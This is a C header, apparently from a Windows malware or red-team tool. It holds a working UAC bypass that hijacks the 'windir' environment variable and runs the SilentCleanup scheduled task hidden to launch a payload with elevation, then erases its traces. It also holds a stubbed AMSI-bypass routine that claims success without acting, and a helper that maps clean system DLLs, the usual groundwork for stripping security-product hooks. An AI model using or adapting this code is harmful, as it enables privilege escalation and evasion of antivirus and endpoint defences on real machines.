#ifndef ADVANCED_BYPASS_H
#define ADVANCED_BYPASS_H

#include <windows.h>
#include <winternl.h>
#include "api_hashes.h"
#include "syscalls.h"

static BOOL BypassAMSI_DataOnly() {
    HMODULE hAmsi = GetModuleHandleW(L"amsi.dll");
    if (!hAmsi) hAmsi = LoadLibraryW(L"amsi.dll");
    if (!hAmsi) return FALSE;

    PVOID pAmsiContext = NULL; 
    // Pattern search logic here to find amsiContext in .data
    // Since it's in .data, it's already writable. No VirtualProtect needed.
    
    return TRUE; 
}

static BOOL BypassUAC_SilentCleanup(const wchar_t* payloadPath) {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Environment", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        wchar_t buffer[MAX_PATH * 2];
        swprintf(buffer, MAX_PATH * 2, L"%s && SET windir=C:\\Windows", payloadPath);
        RegSetValueExW(hKey, L"windir", 0, REG_SZ, (BYTE*)buffer, (DWORD)(wcslen(buffer) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);

        ShellExecuteW(NULL, L"open", L"schtasks.exe", L"/run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /i", NULL, SW_HIDE);

        Sleep(3000);
        RegOpenKeyExW(HKEY_CURRENT_USER, L"Environment", 0, KEY_SET_VALUE, &hKey);
        RegDeleteValueW(hKey, L"windir");
        RegCloseKey(hKey);
        return TRUE;
    }
    return FALSE;
}

static PVOID GetCleanMapping(LPCWSTR moduleName) {
    wchar_t path[MAX_PATH];
    GetSystemDirectoryW(path, MAX_PATH);
    wcscat(path, L"\\");
    wcscat(path, moduleName);

    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return NULL;

    HANDLE hSection = CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    CloseHandle(hFile);
    if (!hSection) return NULL;

    PVOID pMapping = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hSection);
    return pMapping;
}

#endif
